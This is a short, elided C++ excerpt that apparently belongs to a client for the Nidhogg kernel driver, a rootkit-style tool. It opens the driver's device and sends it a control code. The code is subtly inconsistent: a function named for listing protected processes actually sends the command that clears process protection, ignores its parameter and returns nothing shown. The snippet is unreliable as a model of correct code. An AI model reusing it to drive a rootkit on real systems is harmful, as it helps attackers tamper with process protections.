...
DWORD* NidhoggListProtectedProcesses(std::vector<DWORD> pids) {
    DWORD pidsList[MAX_PIDS] = {0};
    DWORD bytes;
    HANDLE hFile = CreateFile(L"\\\\.\\Nidhogg", GENERIC_WRITE | GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    ...
    DeviceIoControl(hFile, IOCTL_NIDHOGG_CLEAR_PID_PROTECTION, &pidsList, sizeof(pidsList), nullptr, 0, &bytes, nullptr);    
